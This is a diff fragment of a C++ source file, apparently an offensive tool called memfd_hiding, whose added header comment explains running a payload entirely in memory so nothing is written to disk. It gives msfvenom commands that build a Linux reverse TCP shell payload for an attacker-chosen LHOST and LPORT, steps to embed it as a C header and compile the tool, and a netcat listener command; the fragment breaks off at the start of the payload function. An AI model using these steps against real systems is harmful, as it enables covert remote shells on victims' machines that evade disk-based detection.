@@ -1,9 +1,31 @@
+/*
+
+Author:  c0d3Ninja
+Website: https://gotr00t0day.github.io
+
+memfd_hiding - Execute a payload entirely in memory without ever writing it to disk.
+
+
+Generate an ELF with msfvenom and convert it to a C header:
+
+x86_64: msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf -o payload.bin
+aarch6: msfvenom -p linux/aarch64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf -o payload.bin
+Convert to header: xxd -i payload.bin > payload.h
+
+USAGE: 
+g++ memfd_hiding.cpp -o memfd_hiding -std=c++20 -pthread
+chmod +x memfd_hiding
+./memfd_hiding (Make sure you're using a listener before running the tool.. ex: nc -lvpn 1337)
+
+*/
+
+
 #define _GNU_SOURCE
 #include <sys/mman.h>
 #include <unistd.h>
 #include <cstring>
 #include <cstdio>
-#include "../modules/payload.h"
+#include "payload.h"
 
 void createPayloadFile() {
     #if defined(__linux__)
